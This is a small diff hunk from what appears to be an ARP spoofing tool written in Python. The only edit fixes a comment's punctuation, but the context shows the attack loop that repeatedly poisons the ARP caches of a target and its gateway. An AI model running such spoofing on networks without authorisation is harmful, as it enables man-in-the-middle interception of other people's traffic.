@@ -63,7 +63,7 @@ try:
     while True:
         hijack(t_ip, t_mac, gateway)
         hijack(gateway, gateway_mac, t_ip)
-        time.sleep(8)   # You can change this lower value can make connection issue
+        time.sleep(8)   # You can change this, lower value can make connection issue
 except KeyboardInterrupt:
     print(Fore.RED + "ARP spoofing terminated")
     timing(x="Finished= ")
